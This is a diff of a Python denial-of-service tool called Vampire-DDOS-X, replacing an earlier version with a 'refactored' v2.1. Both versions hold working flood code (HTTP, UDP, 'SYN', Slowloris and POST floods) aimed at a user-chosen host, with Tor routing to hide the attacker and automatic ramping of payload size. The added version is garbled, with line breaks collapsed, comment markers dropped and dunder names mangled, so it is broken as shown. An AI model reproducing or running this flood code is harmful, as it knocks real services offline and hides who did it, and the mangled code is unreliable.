@@ -1,229 +1,124 @@
-import os
-import sys
-import time
-import socket
-import threading
-import random
-import subprocess
-import getpass
+#!/usr/bin/env python3
 
-# Auto-install required modules
-def install(module, pip_name=None):
-    pip_name = pip_name or module
-    try:
-        __import__(module)
-    except ImportError:
-        subprocess.call([sys.executable, '-m', 'pip', 'install', pip_name])
+-- coding: utf-8 --
 
-install("colorama")
-install("socks", "pysocks")
+""" Vampire-DDOS-X v2.1 Fully refactored by Muhammad Shourov (Vampire Squad) GitHub: https://github.com/vampiresquad/Vampire-DDOS-X License: MIT """
 
-from colorama import Fore, Style, init
-import socks
+import os import sys import time import socket import threading import random import subprocess import getpass import logging from logging.handlers import RotatingFileHandler from concurrent.futures import ThreadPoolExecutor, as_completed from colorama import Fore, Style, init import socks
 
-init(autoreset=True)
+─── Configuration ──────────────────────────────────────────────────────────────
 
-# Admin Passwords
-ADMIN_PASSWORD = "SH404"
-TOR_PASSWORD = "SH404"
+ADMIN_PASSWORD = os.getenv('VDDOS_ADMIN_PW', ':404X') TOR_PASSWORD   = os.getenv('VDDOS_TOR_PW', ':404X') LOG_FILE       = 'vddosx.log' AUDIT_LOG_FILE = 'vddosx_audit.log' MAX_LOG_BYTES  = 5 * 1024 * 1024 BACKUP_COUNT   = 3 ATTACK_TIMEOUT = 5           # seconds per socket INITIAL_PAYLOAD = 1024       # bytes MAX_PAYLOAD     = 65536      # bytes RAMP_INTERVAL   = 30         # seconds RAMP_FACTOR     = 2
 
-# Global Counters
-requests_sent = 0
-threads_running = 0
-attack_active = True
+Shared state
 
-# Banners
-admin_banner = f"""
-{Fore.RED}
-╔══════════════════════════════════════════════╗
-║       █████▒▒▒ ADMIN PANEL ▒▒▒█████         ║
-║    ╔═╗╔═╗╔╦╗╔═╗╦═╗╦╔═╗╔═╗╔═╗  ╔═╗╦ ╦         ║
-║    ╚═╗║╣  ║║║╣ ╠╦╝║║ ╦║╣ ╚═╗  ║ ╦║ ║         ║
-║    ╚═╝╚═╝═╩╝╚═╝╩╚═╩╚═╝╚═╝╚═╝  ╚═╝╚═╝         ║
-║            [Vampire-DDOS-X]                 ║
-║        Developed by: Muhammad Shourov       ║
-╚══════════════════════════════════════════════╝
-"""
+attack_active = threading.Event() attack_active.set() requests_sent = 0 requests_lock = threading.Lock() payload_size = INITIAL_PAYLOAD
 
-user_banner = f"""
-{Fore.CYAN}
-╔══════════════════════════════════════════════╗
-║       █████▒▒▒ USER PANEL ▒▒▒█████          ║
-║    ██    ██ ██████  ██████  ██    ██        ║
-║    ██    ██ ██   ██ ██   ██ ██    ██        ║
-║    ██    ██ ██████  ██████  ██    ██        ║
-║    ██    ██ ██      ██      ██    ██        ║
-║     ██████  ██      ██       ██████         ║
-║          [Vampire-DDOS-X]                   ║
-║      Created by: Muhammad Shourov           ║
-╚══════════════════════════════════════════════╝
-"""
+─── Logger Setup ───────────────────────────────────────────────────────────────
 
-def show_disclaimer():
-    import os, sys, time
-    from colorama import Fore, Style, init
-    init(autoreset=True)
+logger = logging.getLogger('VDDOSX') logger.setLevel(logging.DEBUG) fmt = logging.Formatter( '%(asctime)s [%(threadName)s] %(levelname)s: %(message)s' )
 
-    def shake_terminal():
-        os.system("clear")
-        print("\n" * 5 + Fore.RED + Style.BRIGHT + " " * 20 + "[!! WARNING !!]")
-        time.sleep(0.08)
-        os.system("clear")
-        print("\n" * 3 + Fore.YELLOW + Style.BRIGHT + " " * 15 + "System Integrity Alert!")
-        time.sleep(0.08)
+Console handler
 
-    for _ in range(3):
-        shake_terminal()
+ch = logging.StreamHandler() ch.setLevel(logging.INFO) ch.setFormatter(fmt)
 
-    disclaimer_lines = [
-        f"{Fore.LIGHTRED_EX}{Style.BRIGHT}╔════════════════════════════════════════════════════════════╗",
-        f"{Fore.LIGHTRED_EX}{Style.BRIGHT}║                  {Fore.YELLOW}LEGAL & ETHICAL DISCLAIMER{Fore.LIGHTRED_EX}                  ║",
-        f"{Fore.LIGHTRED_EX}{Style.BRIGHT}╠════════════════════════════════════════════════════════════╣",
-        f"{Fore.WHITE}║ This tool is intended for {Fore.GREEN}educational{Fore.WHITE} and {Fore.GREEN}ethical use{Fore.WHITE} only.  ║",
-        f"{Fore.WHITE}║ Unauthorized usage is strictly {Fore.RED}prohibited{Fore.WHITE} and may      ║",
-        f"{Fore.WHITE}║ violate national and international {Fore.MAGENTA}cybercrime laws{Fore.WHITE}. ║",
-        f"{Fore.WHITE}║                                                            ║",
-        f"{Fore.WHITE}║ You must have proper {Fore.CYAN}authorization{Fore.WHITE} to test any system.  ║",
-        f"{Fore.WHITE}║ The developer is {Fore.RED}not responsible{Fore.WHITE} for any misuse.        ║",
-        f"{Fore.WHITE}║                                                            ║",
-        f"{Fore.YELLOW}║ Entering this tool means you fully agree to these terms. {Fore.LIGHTRED_EX}║",
-        f"{Fore.LIGHTRED_EX}{Style.BRIGHT}╚════════════════════════════════════════════════════════════╝",
-        "",
-        f"{Fore.CYAN}{Style.BRIGHT} Author   : {Fore.GREEN}Muhammad Shourov (VAMPIRE)",
-        f"{Fore.CYAN} Team     : {Fore.MAGENTA}Vampire Squad",
-        f"{Fore.CYAN} GitHub   : {Fore.YELLOW}https://github.com/vampiresquad",
-        f"{Fore.CYAN} Contact  : {Fore.LIGHTWHITE_EX}vampiresquad.org@gmail.com",
-        f"{Fore.CYAN} Powered  : {Fore.RED}DRACULA {Fore.CYAN}- Terminal of Vampire Squad",
-        "",
-        f"{Fore.GREEN}{Style.BRIGHT}[!] Press ENTER if you agree with the above terms to continue..."
-    ]
+Rotating file handler
 
-    for line in disclaimer_lines:
-        for char in line:
-            sys.stdout.write(char)
-            sys.stdout.flush()
-            time.sleep(0.0009)
-        print()
-def install_tor():
-    try:
-        subprocess.call(['pkg', 'install', '-y', 'tor'])
-    except:
-        print("[!] TOR installation failed. Please install manually.")
+fh = RotatingFileHandler(LOG_FILE, maxBytes=MAX_LOG_BYTES, backupCount=BACKUP_COUNT) fh.setLevel(logging.DEBUG) fh.setFormatter(fmt) logger.addHandler(ch) logger.addHandler(fh)
 
-def enable_tor():
-    print("[?] Enable Anonymous Mode (TOR)? (y/n): ", end='')
-    if input().lower() == 'y':
-        password = getpass.getpass("Enter TOR password: ")
-        if password == TOR_PASSWORD:
-            print("[✓] Enabling TOR routing...")
-            install_tor()
-            os.system("tor &")
-            time.sleep(5)
-            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
-            socket.socket = socks.socksocket
-            print("[✓] TOR routing enabled.")
-        else:
-            print("[!] Wrong TOR password. Skipping...")
+Audit logger
 
-def attack(target, port, attack_type):
-    global requests_sent, threads_running, attack_active
-    threads_running += 1
-    try:
-        while attack_active:
-            try:
-                if attack_type == "2":
-                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    s.sendto(random._urandom(1024), (target, port))
-                else:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.connect((target, port))
-                    if attack_type == "1":
-                        req = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
-                        s.send(req.encode())
-                    elif attack_type == "3":
-                        s.send(b"\x00" * 1024)
-                    elif attack_type == "4":
-                        for _ in range(50):
-                            s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
-                            time.sleep(0.5)
-                    elif attack_type == "5":
-                        payload = "username=admin&password=admin"
-                        headers = f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{payload}"
-                        s.send(headers.encode())
-                s.close()
-                requests_sent += 1
-            except:
-                continue
-    finally:
-        threads_running -= 1
+audit = logging.getLogger('VDDOSX_AUDIT') audit_handler = RotatingFileHandler(AUDIT_LOG_FILE, maxBytes=MAX_LOG_BYTES, backupCount=BACKUP_COUNT) audit_handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s')) audit.addHandler(audit_handler) audit.setLevel(logging.INFO)
 
-def show_stats():
-    while attack_active:
-        print(f"{Fore.YELLOW}[~] Requests Sent: {requests_sent} | Threads Running: {threads_running}{Style.RESET_ALL}", end='\r')
-        time.sleep(1)
+────────────────────────────────────────────────────────────────────────────────
 
-def main():
-    print(f"{Fore.CYAN}[?] Enter Mode (admin/user): {Style.RESET_ALL}", end='')
-    mode = input().strip().lower()
-    show_disclaimer()
+─── Auto-fix Routine ──────────────────────────────────────────────────────────
 
-    if mode == "admin":
-        pw = getpass.getpass("Enter Admin Password: ")
-        if pw != ADMIN_PASSWORD:
-            print("[!] Wrong password. Access denied.")
-            return
-        print(admin_banner)
-    else:
-        print(user_banner)
+def auto_fix(error): logger.warning(f"Auto-fixing error: {error}") msg = str(error) # Handle missing modules if 'No module named' in msg: mod = msg.split("'")[1] install(mod) # Handle pip/apt failures elif isinstance(error, subprocess.CalledProcessError): logger.info("Retrying failed subprocess command...") # Could implement retry logic here # Handle socket issues elif isinstance(error, socket.error): logger.info("Reinitializing socket library...") # Generic fallback time.sleep(1)
 
-    enable_tor()
+─── Module Auto-Install ────────────────────────────────────────────────────────
 
-    try:
-        target = input("[+] Target IP/Host: ").strip()
-        port = int(input("[+] Target Port: "))
-        if port <= 0 or port > 65535:
-            print("[!] Invalid port number.")
-            return
-        threads = int(input("[+] Threads Count: "))
-        if threads <= 0:
-            print("[!] Thread count must be positive.")
-            return
-    except ValueError:
-        print("[!] Invalid input. Please enter numbers where required.")
+def install(module, pip_name=None): pip_name = pip_name or module try: import(module) except ImportError as e: logger.info(f"Installing missing module: {pip_name}") try: subprocess.check_call([sys.executable, '-m', 'pip', 'install', pip_name]) except subprocess.CalledProcessError as cp_err: auto_fix(cp_err)
+
+────────────────────────────────────────────────────────────────────────────────
+
+─── Advanced Disclaimer ─────────────────────────────────────────────────────────
+
+def show_disclaimer(): disclaimer = f""" {Fore.RED}{Style.BRIGHT}THIS TOOL IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND. USE ONLY WITH EXPLICIT AUTHORIZATION. VIOLATORS ASSUME ALL LIABILITY. See LICENSE (MIT) in repository for details.{Style.RESET_ALL} """ logger.warning(disclaimer) input("Press ENTER to confirm authorization...") pw = getpass.getpass("Enter authorization password: ") audit.info(f'User entered auth password: {len(pw)} chars') if pw != ADMIN_PASSWORD: logger.error("Invalid authorization password—exiting.") sys.exit(1)
+
+────────────────────────────────────────────────────────────────────────────────
+
+─── TOR Setup ─────────────────────────────────────────────────────────────────
+
+def install_tor(): try: subprocess.check_call(['pkg', 'install', '-y', 'tor']) except subprocess.CalledProcessError as e: auto_fix(e) raise
+
+def enable_tor(): ans = input("Enable TOR routing? (y/n): ").strip().lower() if ans == 'y': pw = getpass.getpass("Enter TOR password: ") if pw == TOR_PASSWORD: logger.info("Enabling TOR...") install_tor() subprocess.Popen(['tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) time.sleep(5) socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050) socket.socket = socks.socksocket logger.info("TOR routing enabled.") else: logger.warning("Incorrect TOR password; skipping TOR.")
+
+────────────────────────────────────────────────────────────────────────────────
+
+─── Attack Logic ───────────────────────────────────────────────────────────────
+
+def attack(target, port, attack_type): global requests_sent, payload_size sock = None try: while attack_active.is_set(): try: # Choose payload size based on current ramp size = payload_size if attack_type == "2":  # UDP Flood sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock.settimeout(ATTACK_TIMEOUT) sock.sendto(random._urandom(size), (target, port)) else:  # TCP-based sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(ATTACK_TIMEOUT) sock.connect((target, port)) if attack_type == "1":  # HTTP sock.sendall(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()) elif attack_type == "3":  # SYN sock.sendall(b"\x00" * size) elif attack_type == "4":  # Slowloris for _ in range(50): sock.sendall(f"X-a: {random.randint(1,5000)}\r\n".encode()) time.sleep(0.5) elif attack_type == "5":  # POST payload = "username=admin&password=admin" headers = ( f"POST / HTTP/1.1\r\nHost: {target}\r\n" f"Content-Length: {len(payload)}\r\n" f"Content-Type: application/x-www-form-urlencoded\r\n\r\n{payload}" ) sock.sendall(headers.encode()) with requests_lock: requests_sent += 1 logger.debug(f"Sent packet #{requests_sent} of size {size}") except Exception as e: logger.debug(f"Error during attack send: {e}") auto_fix(e) continue finally: if sock: sock.close()
+
+────────────────────────────────────────────────────────────────────────────────
+
+def show_stats(): while attack_active.is_set(): logger.info(f"Requests Sent: {requests_sent} | Current Payload: {payload_size} bytes") time.sleep(1)
+
+─── Strength Ramping ───────────────────────────────────────────────────────────
+
+def ramp_strength(): global payload_size while attack_active.is_set() and payload_size < MAX_PAYLOAD: time.sleep(RAMP_INTERVAL) new_size = min(payload_size * RAMP_FACTOR, MAX_PAYLOAD) if new_size != payload_size: payload_size = new_size logger.info(f"Attack strength increased: payload_size={payload_size}")
+
+────────────────────────────────────────────────────────────────────────────────
+
+def main(): init(autoreset=True) logger.info("Vampire-DDOS-X v2.1 starting...") show_disclaimer()
+
+mode = input("Enter mode (admin/user): ").strip().lower()
+if mode == 'admin':
+    pw = getpass.getpass("Admin password: ")
+    if pw != ADMIN_PASSWORD:
+        logger.error("Wrong admin password.")
         return
 
-    print("""
-[?] Select Attack Type:
+enable_tor()
+
+try:
+    target  = input("Target IP/Host: ").strip()
+    port    = int(input("Target Port: "))
+    threads = int(input("Threads Count: "))
+    if not (1 <= port <= 65535 and threads > 0):
+        raise ValueError("Invalid numerical inputs")
+except Exception as e:
+    logger.error(f"Input error: {e}")
+    auto_fix(e)
+    return
+
+print("""\nAttack Types:
 1. HTTP Flood
 2. UDP Flood
 3. SYN Flood
 4. Slowloris
 5. POST Flood
-""")
-    attack_type = input("[+] Choice: ").strip()
-    if attack_type not in ["1", "2", "3", "4", "5"]:
-        print("[!] Invalid attack type.")
-        return
 
-    print(f"{Fore.GREEN}[✓] Attack started on {target}:{port} using mode {attack_type} with {threads} threads.{Style.RESET_ALL}")
-    time.sleep(1)
+""") attack_type = input("Choice: ").strip() if attack_type not in {"1","2","3","4","5"}: logger.error("Invalid attack type.") return
 
-    threading.Thread(target=show_stats).start()
-    for _ in range(threads):
-        t = threading.Thread(target=attack, args=(target, port, attack_type))
-        t.daemon = True
-        t.start()
+logger.info(f"Starting attack on {target}:{port} with {threads} threads (type {attack_type})")
+audit.info(f'Attack launched: {target}:{port}, threads={threads}, type={attack_type}')
 
+# Start stats and ramp threads
+threading.Thread(target=show_stats, daemon=True).start()
+threading.Thread(target=ramp_strength, daemon=True).start()
+
+# Launch attack threads
+with ThreadPoolExecutor(max_workers=threads) as executor:
+    futures = [executor.submit(attack, target, port, attack_type) for _ in range(threads)]
     try:
-        while True:
-            time.sleep(1)
+        for _ in as_completed(futures):
+            pass
     except KeyboardInterrupt:
-        global attack_active
-        attack_active = False
-        print(f"\n{Fore.RED}[!] You Stopped the Attack.{Style.RESET_ALL}")
-        print(f"{Fore.MAGENTA}[#] Total Requests Sent: {requests_sent}{Style.RESET_ALL}")
-        os.system("pkill tor")
-        print(f"{Fore.RED}[X] You Shutting down Vampire-DDOS-X... 'We are Legend Warrior, We can do Anything(See you Soon,Allah Haffez)!{Style.RESET_ALL}")
+        logger.warning("User requested stop.")
+        attack_active.clear()
 
-if __name__ == "__main__":
-    main()
+logger.info(f"Attack stopped. Total requests: {requests_sent}")
+
+if name == 'main': main()
+
